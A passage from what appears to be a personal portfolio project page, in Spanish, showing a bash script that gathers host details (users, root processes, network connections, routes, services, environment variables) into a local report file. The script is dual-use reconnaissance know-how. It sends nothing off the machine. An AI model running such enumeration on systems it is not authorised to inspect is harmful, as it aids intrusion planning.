<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Hostname: $(</span><span style="color:#50FA7B">hostname</span><span style="color:#F1FA8C">)</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Distribuci√≥n y versi√≥n:</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> /etc/</span><span style="color:#BD93F9;font-style:italic">*</span><span style="color:#F1FA8C">release</span><span style="color:#FF79C6"> 2></span><span style="color:#F1FA8C">/dev/null</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#BD93F9"> -E</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">NAME=|VERSION=</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Kernel: $(</span><span style="color:#50FA7B">uname</span><span style="color:#BD93F9"> -r</span><span style="color:#F1FA8C">)</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Arquitectura: $(</span><span style="color:#50FA7B">uname</span><span style="color:#BD93F9"> -m</span><span style="color:#F1FA8C">)</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Tiempo encendido:</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">uptime</span><span style="color:#BD93F9"> -p</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Interfaces de red y direcciones IP:</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">ip</span><span style="color:#BD93F9"> -brief</span><span style="color:#F1FA8C"> address</span><span style="color:#F1FA8C"> show</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Rutas activas:</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">ip</span><span style="color:#F1FA8C"> route</span><span style="color:#F1FA8C"> show</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Variables de entorno relevantes:</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">env</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#BD93F9"> -E</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">USER|HOME|SHELL|PATH|HTTP|PROXY</span><span style="color:#E9F284">'</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Procesos privilegiados (root):</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">ps</span><span style="color:#BD93F9"> -U</span><span style="color:#F1FA8C"> root</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> root</span><span style="color:#F1FA8C"> u</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> head</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> 10</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Conexiones activas:</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">ss</span><span style="color:#BD93F9"> -tupan</span><span style="color:#FF79C6"> 2></span><span style="color:#F1FA8C">/dev/null</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> head</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> 10</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Usuarios del sistema:</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">getent</span><span style="color:#F1FA8C"> passwd</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#BD93F9"> -v</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">nologin</span><span style="color:#E9F284">'</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Servicios en ejecuci√≥n:</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">systemctl</span><span style="color:#F1FA8C"> list-units</span><span style="color:#BD93F9"> --type=service</span><span style="color:#BD93F9"> --state=running</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> head</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> 15</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Variables de entorno Docker/podman (si existen):</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#50FA7B">env</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#BD93F9"> -iE</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">docker|container|podman</span><span style="color:#E9F284">'</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[+] Informe generado en </span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre> </div> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/projects" class="text-slate-400 hover:text-accentBlue transition-colors">
‚Üê Volver a la lista de proyectos
</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
¬© 2025 Angel Corral - Todos los derechos reservados.
</div> </footer> </div> </body></html>